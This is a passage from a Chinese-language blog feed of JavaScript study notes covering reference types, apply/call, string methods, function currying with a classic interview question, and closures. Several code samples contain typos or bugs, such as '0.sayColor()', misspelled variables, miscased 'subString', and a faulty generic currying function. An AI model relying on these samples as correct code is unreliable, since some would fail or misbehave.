class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//函数执行与函数名&quot;factorial&quot;紧耦合在一起</span><br><span class="line">function factorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return num * factorial(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//无论函数取什么名字都能正常递归</span><br><span class="line">function factorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return num * arguments.callee(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="this："><a href="#this：" class="headerlink" title="this："></a>this：</h4><p>引用函数当前执行的环境对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.color = &quot;red&quot;;</span><br><span class="line">var o = &#123;color:&quot;blue&quot;&#125;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(this.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor();  //&quot;red&quot;，this为全局对象</span><br><span class="line">o.sayColor = sayColor;</span><br><span class="line">alert(0.sayColor());  //&quot;blue&quot;，this为对象o</span><br></pre></td></tr></table></figure></p><h4 id="caller"><a href="#caller" class="headerlink" title="caller:"></a>caller:</h4><p>ES5引入，保存调用当前函数的函数引用，如果实在全局调用，其值为null<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function outer()&#123;</span><br><span class="line">    inner();</span><br><span class="line">&#125;</span><br><span class="line">function inner()&#123;</span><br><span class="line">    alert(inner.caller); //可解耦合写成alert(arguments.callee.caller)</span><br><span class="line">&#125;</span><br><span class="line">outer();  //outer</span><br></pre></td></tr></table></figure></p><h3 id="函数的属性和方法："><a href="#函数的属性和方法：" class="headerlink" title="函数的属性和方法："></a>函数的属性和方法：</h3><h4 id="length属性"><a href="#length属性" class="headerlink" title="length属性:"></a>length属性:</h4><p>表示函数希望接收的命名参数个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sayName(name)&#123;&#125;</span><br><span class="line">function sum(num1,num2)&#123;&#125;</span><br><span class="line">function sayHi()&#123;&#125;</span><br><span class="line">alert(sayName.length);  //1</span><br><span class="line">alert(sum.length);  //2</span><br><span class="line">alert(sayHi.length);  //0</span><br></pre></td></tr></table></figure></p><h4 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性:"></a>prototype属性:</h4><p>保存它们所有实例方法的真正所在</p><h4 id="function-apply"><a href="#function-apply" class="headerlink" title="function apply:"></a>function apply:</h4><p>在特定的作用域中调用函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">function callSum1(num1,num2)&#123;</span><br><span class="line">    return sum.apply(this,arguments);</span><br><span class="line">&#125;</span><br><span class="line">function callSum2(num1,num2)&#123;</span><br><span class="line">    return sum.apply(this,[num1,num2]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="function-apply-1"><a href="#function-apply-1" class="headerlink" title="function apply:"></a>function apply:</h4><p>与apply方法的作用相同，区别在于除了第一个参数this,其余参数都须直接传给函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function sum(num1,num2)&#123;</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">function callSum(num1,num2)&#123;</span><br><span class="line">    return sum.call(this,num1,num2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>apply()和call()真正强大是能够扩充函数赖以运行的作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">window.color = &quot;red&quot;;</span><br><span class="line">var o = &#123;color:&quot;blue&quot;&#125;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(this.color);</span><br><span class="line">&#125;</span><br><span class="line">sayColor();  //&quot;red&quot;</span><br><span class="line">sayColor.call(this);  //&quot;red&quot;</span><br><span class="line">sayColor.call(window);  //&quot;red&quot;</span><br><span class="line">sayColor.call(o);   //&quot;blue&quot;</span><br></pre></td></tr></table></figure></p><p>用这种方法来扩充作用域对象不需要与方法有任何耦合关系</p><h2 id="基本包装类型"><a href="#基本包装类型" class="headerlink" title="基本包装类型"></a>基本包装类型</h2><h3 id="Boolean类型："><a href="#Boolean类型：" class="headerlink" title="Boolean类型："></a>Boolean类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var falseObject = new Boolean(false);</span><br><span class="line">var result = falseObjet &amp;&amp; true;</span><br><span class="line">alert(result);  //true</span><br><span class="line">var falseValue = false;</span><br><span class="line">result = falseValue &amp;&amp; true;</span><br><span class="line">alert(result);  //false</span><br></pre></td></tr></table></figure><h3 id="Number类型："><a href="#Number类型：" class="headerlink" title="Number类型："></a>Number类型：</h3><p>Number类型重写了valueOf,toLocalString和toString方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var num = 10;</span><br><span class="line">alert(num.toString());   //&quot;10&quot;，默认十进制表示</span><br><span class="line">alert(num.toString(2));  //&quot;1010&quot;，二进制表示</span><br><span class="line">alert(num.toFixed(2));   //&quot;10.00&quot;，按照指定小数位返回</span><br><span class="line">alert(num.toExponential(1));   //&quot;1.0e+1&quot;，按照指定位数返回指数表示法</span><br></pre></td></tr></table></figure></p><h3 id="String类型："><a href="#String类型：" class="headerlink" title="String类型："></a>String类型：</h3><h4 id="字符方法："><a href="#字符方法：" class="headerlink" title="字符方法："></a>字符方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.charAt(1));  //&quot;e&quot;</span><br><span class="line">alert(stringValue.charCodeAt(1));  //&quot;101&quot;,小写字母e字符编码</span><br></pre></td></tr></table></figure><h4 id="字符串操作方法："><a href="#字符串操作方法：" class="headerlink" title="字符串操作方法："></a>字符串操作方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var stringValue = &quot;hello&quot;;</span><br><span class="line">var result = stringValue.concat(&quot; world&quot;,&quot;!&quot;);  //返回新字符串</span><br><span class="line">alert(result);  //&quot;hello world!&quot;</span><br><span class="line">alert(stringValue);  //&quot;hello&quot;</span><br><span class="line"></span><br><span class="line">var stringValue = &quot;hello world&quot;;</span><br><span class="line">alert(stringValue.slice(3));  //&quot;lo world&quot;</span><br><span class="line">alert(stringValue.subString(3));  //&quot;lo world&quot;</span><br><span class="line">alert(stringValue.subStr(3));  //&quot;lo world&quot;</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(3,7));  //&quot;lo w&quot;，起始位置，结束位置</span><br><span class="line">alert(stringValue.subString(3,7));  //&quot;lo w&quot;，同上</span><br><span class="line">alert(stringValue.subStr(3,7));  //&quot;lo worl&quot;，起始位置，返回字符个数</span><br><span class="line"></span><br><span class="line">alert(stringValue.slice(-3));  //&quot;rld&quot;</span><br><span class="line">alert(stringValue.subString(-3));  //&quot;hello world&quot;，把所有负数转换成0</span><br><span class="line">alert(stringValue.subStr(-3));  //&quot;rld&quot;，负数加上数组长度</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h2&gt;&lt;p&gt;引用类型的值（对象）是引用类型的一个实例。&lt;br&gt;引用类型是一种数据结构，用于将数据和功能组织在一起。&lt;/p&gt;
&lt;h2 id=&quot;Object类型&quot;&gt;&lt;a href=&quot;#Object类型&quot; class=&quot;headerlink&quot; title=&quot;Object类型&quot;&gt;&lt;/a&gt;Object类型&lt;/h2&gt;&lt;h3 id=&quot;创建方式：&quot;&gt;&lt;a href=&quot;#创建方式：&quot; class=&quot;headerlink&quot; title=&quot;创建方式：&quot;&gt;&lt;/a&gt;创建方式：&lt;/h3&gt;&lt;p&gt;使用new操作符后跟Object构造函数。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var person = new Object();   //与 var person = &amp;#123;&amp;#125; 等同&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.name = &amp;quot;Nicholas&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.age = 29;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>函数柯里化</title>
    <link href="http://dangoying.ink/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html"/>
    <id>http://dangoying.ink/函数柯里化.html</id>
    <published>2019-06-13T13:56:58.000Z</published>
    <updated>2019-06-16T10:51:23.332Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>老是听大佬们口中谈及函数柯里化，在没有了解之前，我一直认为这是一个十分高深的东西，然而在接触后也深深被他的魅力吸引，那么究竟什么是柯里化？柯里化又有什么好处？作为一个前端工程狮，这是你必须掌握的高级技能。</p></blockquote><h2 id="什么是柯里化-Currying"><a href="#什么是柯里化-Currying" class="headerlink" title="什么是柯里化(Currying)"></a>什么是柯里化(Currying)</h2><p>柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术。也就是将具有多个元的函数转化为具有较少元的函数。</p><a id="more"></a><p>来看下面的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function add(a,b,c)&#123;</span><br><span class="line">    return a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function curryingAdd(a)&#123;</span><br><span class="line">    return function(b)&#123;</span><br><span class="line">        return function(c)&#123;</span><br><span class="line">            return a + b + c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(1,2,3);             //3 </span><br><span class="line">curryingAdd(1)(2)(3);   //3</span><br></pre></td></tr></table></figure></p><h2 id="Currying的核心思想"><a href="#Currying的核心思想" class="headerlink" title="Currying的核心思想"></a>Currying的核心思想</h2><p>柯里化的核心思想就是降低通用性，提高适用性。<br>举个例子说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ajax(&quot;get&quot;,&quot;url&quot;,&quot;data&quot;);</span><br><span class="line">Ajaxget(&quot;url&quot;,&quot;data&quot;);</span><br></pre></td></tr></table></figure></p><p>上述代码中，Ajax是一个通用性的方法，而Ajaxget是一个只针对get请求的方法，从性能上来看，通用性的方法需要对请求的类型进行判断，而通过调用Ajaxget可以减少判断，同时我们可以直接从api上得知请求的类型，对于后期的开发维护也有帮助。</p><h2 id="Currying的特点"><a href="#Currying的特点" class="headerlink" title="Currying的特点"></a>Currying的特点</h2><ul><li>参数复用：如果是相同的参数，在计算之后不需要再次重新传参计算</li><li>提前返回：多次调用多次内部判断，可以直接把第一次判断的结果返回外部接受</li><li>延迟执行：避免重复执行程序，等真正需要结果的时候，再执行</li></ul><h3 id="参数复用"><a href="#参数复用" class="headerlink" title="参数复用"></a>参数复用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function curryingAdd(a)&#123;</span><br><span class="line">    return function(b)&#123;</span><br><span class="line">        return function(c)&#123;</span><br><span class="line">            return a + b + c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var add1 = curryingAdd(1);</span><br><span class="line">var add2 = add1(2);</span><br><span class="line"></span><br><span class="line">console.log(add2(3));</span><br><span class="line">console.log(add2(4));</span><br></pre></td></tr></table></figure><p>还是以刚才的例子做说明，通过复用参数，我们可以实现空间换时间，在调用add2进行计算时，实际上只进行了一次计算。</p><h3 id="提前返回"><a href="#提前返回" class="headerlink" title="提前返回"></a>提前返回</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var addEvent = function(el, type, fn, capture)&#123;</span><br><span class="line">    if(window.addEventListener)&#123;</span><br><span class="line">        el.addEventListener(type, function()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(window.attachEvent)&#123;</span><br><span class="line">        el.attachEvent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addEvent(div,click,callback,false);   //判断一次</span><br><span class="line">addEvent(p,click,callback,false);     //判断二次</span><br><span class="line">addEvent(span,click,callback,false);  //判断三次</span><br></pre></td></tr></table></figure><p>上述代码是兼容浏览器添加事件的一段常用的代码，但在使用中，会多次进行浏览器版本的判断，而浏览器的版本在打开浏览器的时候就已经确定，重复的判断反而会降低使用性能，所以可以利用柯里化思想对上述代码进行下面的改进。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var addEvent = function()&#123;</span><br><span class="line">    if(window.addEventListener)&#123;</span><br><span class="line">        return function(el, type, fn, capture)&#123;</span><br><span class="line">            el.addEventListener(type, function()&#123;&#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(window.attachEvent)&#123;</span><br><span class="line">        return function(el, type, fn, capture)&#123;</span><br><span class="line">            el.attachEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//只判断一次</span><br><span class="line">var addEvent_new = addEvent</span><br><span class="line"></span><br><span class="line">addEvent_new(div,click,callback,false);   </span><br><span class="line">addEvent_new(p,click,callback,false);     </span><br><span class="line">addEvent_new(span,click,callback,false);</span><br></pre></td></tr></table></figure><h3 id="延迟执行"><a href="#延迟执行" class="headerlink" title="延迟执行"></a>延迟执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var curryScore = function(fn)&#123;</span><br><span class="line">    var _allScore = [];  //存放分数</span><br><span class="line">    return function()&#123;</span><br><span class="line">        if(arguments.length === 0)&#123;</span><br><span class="line">            return fn.apply(null,_allScore); //对象冒充，形实转换</span><br><span class="line">        &#125;</span><br><span class="line">        _allScorll = _allScore.concat([].slice.call(arguments));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var allScore = 0;</span><br><span class="line">var addScore = curryScore(function()&#123;</span><br><span class="line">    for(var i = 0; i &lt; arguments.length; i++)&#123;</span><br><span class="line">        allScore +=arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">addScore(2);</span><br><span class="line">addScore(3);</span><br><span class="line">addScore(3);</span><br><span class="line">addScore(2);</span><br><span class="line">addScore(1);</span><br><span class="line">addScore();  //11</span><br></pre></td></tr></table></figure><p>上述代码的思想就是先把传入的参数都保存起来，当达到某个延迟条件时，进行输出。</p><h2 id="通用封装方法"><a href="#通用封装方法" class="headerlink" title="通用封装方法"></a>通用封装方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 支持多参数传递</span><br><span class="line">function progressCurrying(fn, args) &#123;</span><br><span class="line"></span><br><span class="line">    var _this = this</span><br><span class="line">    var len = fn.length;</span><br><span class="line">    var args = args || [];</span><br><span class="line"></span><br><span class="line">    return function() &#123;</span><br><span class="line">        var _args = Array.prototype.slice.call(arguments);</span><br><span class="line">        Array.prototype.push.apply(args, _args);</span><br><span class="line"></span><br><span class="line">        // 如果参数个数小于最初的fn.length，则递归调用，继续收集参数</span><br><span class="line">        if (_args.length &lt; len) &#123;</span><br><span class="line">            return progressCurrying.call(_this, fn, _args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 参数收集完毕，则执行fn</span><br><span class="line">        return fn.apply(this, _args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Currying的性能开销"><a href="#Currying的性能开销" class="headerlink" title="Currying的性能开销"></a>Currying的性能开销</h2><p>虽然柯里化提高了函数的适用性，但是它还是会产生一些性能的开销。</p><ul><li>存取arguments对象通常要比存取命名参数要慢一点</li><li>一些老版本的浏览器在arguments.length的实现上是相当慢的</li><li>使用fn.apply() 和 fn.call()通常比直接调用fn()稍微慢点</li><li>创建大量嵌套作用域和闭包函数会带来花销，无论是在内存还是速度上</li></ul><p>但性能的主要瓶颈在操作DOM结点的开销，Currying这部分性能损耗基本可以忽略不计。</p><h2 id="经典柯里化面试题"><a href="#经典柯里化面试题" class="headerlink" title="经典柯里化面试题"></a>经典柯里化面试题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 实现一个add方法，使计算结果能够满足如下预期：</span><br><span class="line">add(1)(2)(3) = 6;</span><br><span class="line">add(1, 2, 3)(4) = 10;</span><br><span class="line">add(1)(2)(3)(4)(5) = 15;</span><br><span class="line"></span><br><span class="line">function add() &#123;</span><br><span class="line">    // 第一次执行时，定义一个数组专门用来存储所有的参数</span><br><span class="line">    var _args = Array.prototype.slice.call(arguments);</span><br><span class="line"></span><br><span class="line">    // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值</span><br><span class="line">    var _adder = function() &#123;</span><br><span class="line">        _args.push(...arguments);</span><br><span class="line">        return _adder;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 利用toString隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回</span><br><span class="line">    _adder.toString = function () &#123;</span><br><span class="line">        return _args.reduce(function (a, b) &#123;</span><br><span class="line">            return a + b;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    return _adder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(1)(2)(3)                // 6</span><br><span class="line">add(1, 2, 3)(4)             // 10</span><br><span class="line">add(1)(2)(3)(4)(5)          // 15</span><br><span class="line">add(2, 6)(1)                // 9</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;老是听大佬们口中谈及函数柯里化，在没有了解之前，我一直认为这是一个十分高深的东西，然而在接触后也深深被他的魅力吸引，那么究竟什么是柯里化？柯里化又有什么好处？作为一个前端工程狮，这是你必须掌握的高级技能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是柯里化-Currying&quot;&gt;&lt;a href=&quot;#什么是柯里化-Currying&quot; class=&quot;headerlink&quot; title=&quot;什么是柯里化(Currying)&quot;&gt;&lt;/a&gt;什么是柯里化(Currying)&lt;/h2&gt;&lt;p&gt;柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术。也就是将具有多个元的函数转化为具有较少元的函数。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://dangoying.ink/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>JS函数表达式（闭包）</title>
    <link href="http://dangoying.ink/JS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E9%97%AD%E5%8C%85%EF%BC%89.html"/>
    <id>http://dangoying.ink/JS函数表达式（闭包）.html</id>
    <published>2019-05-27T14:27:49.000Z</published>
    <updated>2019-06-02T10:00:48.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="函数声明和函数表达式"><a href="#函数声明和函数表达式" class="headerlink" title="函数声明和函数表达式"></a>函数声明和函数表达式</h3><p>函数声明：重要特征是函数声明提升，在执行代码之前会先读取函数声明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sayHi();</span><br><span class="line">function sayHi()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>函数表达式（匿名函数）：匿名函数的name属性是空字符串，有时也称函数拉姆达函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>使用arguments.callee指向正在执行的函数指针，可以实现对函数的递归调用，且比直接使用函数名更加安全。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function facorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * arguments.callee(num-1); //使之与函数名解耦合</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上方法在严格模式下会出错，在严格模式下，可使用命名函数表达式达成相同的结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var factorial = (function f(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * f(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><p>闭包是指有权访问另一个函数作用域中的变量的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createComparesonFuncion(popertyName)&#123;</span><br><span class="line">    return function(object1,object2)&#123;</span><br><span class="line">        var value1 = object1[propertyName];</span><br><span class="line">        var value2 = object2[propertyName];</span><br><span class="line">        if(value1 &lt; value2)&#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125; else if(value1 &gt; value2)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>一般当函数执行完毕后，局部活动对象就会被销毁，内存中仅保存全局作用域，但闭包不同，在另一个函数内部定义的函数会将包含函数（即外部函数）的活动对象加到它的作用域链中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\创建函数</span><br><span class="line">var compareName = createComparesonFunction(&quot;name&quot;);</span><br><span class="line">var result = 